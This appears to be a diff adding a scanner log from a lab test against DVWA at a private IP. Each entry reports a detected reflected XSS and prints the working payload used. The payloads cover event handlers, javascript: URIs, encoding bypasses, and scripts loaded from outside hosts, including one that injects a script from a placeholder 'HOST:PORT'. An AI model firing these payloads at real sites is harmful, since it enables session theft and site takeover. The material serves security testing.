@@ -1,0 +1,1434 @@
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '"onclick=prompt(8)><svg/onload=prompt(8)>"@x.y\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<image/src/onerror=prompt(8)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<img/src/onerror=prompt(8)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<image src/onerror=prompt(8)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<img src/onerror=prompt(8)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<image src =q onerror=prompt(8)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<img src =q onerror=prompt(8)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '</scrip</script>t><img src =q onerror=prompt(8)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<svg onload=alert(1)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '"><svg onload=alert(1)//\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '"onmouseover=alert(1)//\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '"autofocus/onfocus=alert(1)//\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': "'-alert(1)-'\n"}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': "'-alert(1)//\n"}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': "\\'-alert(1)//\n"}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '</script><svg onload=alert(1)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x contenteditable onblur=alert(1)>lose focus! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x onclick=alert(1)>click this! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x oncopy=alert(1)>copy this! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x oncontextmenu=alert(1)>right click this! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x oncut=alert(1)>copy this! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x ondblclick=alert(1)>double click this! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x ondrag=alert(1)>drag this! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x contenteditable onfocus=alert(1)>focus this! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x contenteditable oninput=alert(1)>input here! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x contenteditable onkeydown=alert(1)>press any key! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x contenteditable onkeypress=alert(1)>press any key! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x contenteditable onkeyup=alert(1)>press any key! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x onmousedown=alert(1)>click this! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x onmousemove=alert(1)>hover this! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x onmouseout=alert(1)>hover this! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x onmouseover=alert(1)>hover this! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x onmouseup=alert(1)>click this! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x contenteditable onpaste=alert(1)>paste here!\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<script>alert(1)// \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<script>alert(1)<!–\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<script src=//brutelogic.com.br/1.js> \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<script src=//3334957647/1>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '%3Cx onxxx=alert(1) \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<%78 onxxx=1 \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x %6Fnxxx=1 \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x o%6Exxx=1 \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x on%78xx=1 \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x onxxx%3D1\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<X onxxx=1 \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x OnXxx=1 \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<X OnXxx=1 \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x onxxx=1 onxxx=1\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x/onxxx=1 \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x%09onxxx=1 \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x%0Aonxxx=1 \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x%0Conxxx=1 \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x%0Donxxx=1 \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x%2Fonxxx=1 \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': "<x 1='1'onxxx=1 \n"}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x 1="1"onxxx=1\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x </onxxx=1 \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x 1=">" onxxx=1 \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<http://onxxx%3D1/\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': "<x onxxx=alert(1) 1='\n"}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': "<svg onload=setInterval(function(){with(document)body.appendChild(createElement('script')).src='//HOST:PORT'},0)>\n"}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': "'onload=alert(1)><svg/1='\n"}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': "'>alert(1)</script><script/1=' \n"}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '*/alert(1)</script><script>/*\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '*/alert(1)">\'onload="/*<svg/1=\'\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '`-alert(1)">\'onload="`<svg/1=\'\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': "*/</script>'>alert(1)/*<script/1='\n"}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<script>alert(1)</script> \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<script src=javascript:alert(1)> \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<iframe src=javascript:alert(1)> \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<embed src=javascript:alert(1)> \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<a href=javascript:alert(1)>click \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<math><brute href=javascript:alert(1)>click \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<form action=javascript:alert(1)><input type=submit> \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<isindex action=javascript:alert(1) type=submit value=click> \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<form><button formaction=javascript:alert(1)>click \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<form><input formaction=javascript:alert(1) type=submit value=click> \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<form><input formaction=javascript:alert(1) type=image value=click> \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<form><input formaction=javascript:alert(1) type=image src=SOURCE> \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<isindex formaction=javascript:alert(1) type=submit value=click> \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<object data=javascript:alert(1)> \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;> \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<svg><script xlink:href=data:,alert(1) /> \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<math><brute xlink:href=javascript:alert(1)>click \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<html ontouchstart=alert(1)> \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<html ontouchend=alert(1)> \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<html ontouchmove=alert(1)> \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<html ontouchcancel=alert(1)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<body onorientationchange=alert(1)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '"><img src=1 onerror=alert(1)>.gif\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': 'GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<script src="data:&comma;alert(1)//\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '"><script src=data:&comma;alert(1)//\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<script src="//brutelogic.com.br&sol;1.js&num; \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '"><script src=//brutelogic.com.br&sol;1.js&num; \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<link rel=import href="data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt; \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '"><link rel=import href=data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<base href=//0>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<script/src="data:&comma;eval(atob(location.hash.slice(1)))//#alert(1)\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<body onload=alert(1)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<body onpageshow=alert(1)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<body onfocus=alert(1)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<body onhashchange=alert(1)><a href=#x>click this!#x\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<body style=overflow:auto;height:1000px onscroll=alert(1) id=x>#x\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<body onscroll=alert(1)><br><br><br><br>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<br><br><br><br><br><br><br><br><br><br>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<br><br><br><br><br><br><br><br><br><br>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<br><br><br><br><br><br><x id=x>#x\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<body onresize=alert(1)>press F12!\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
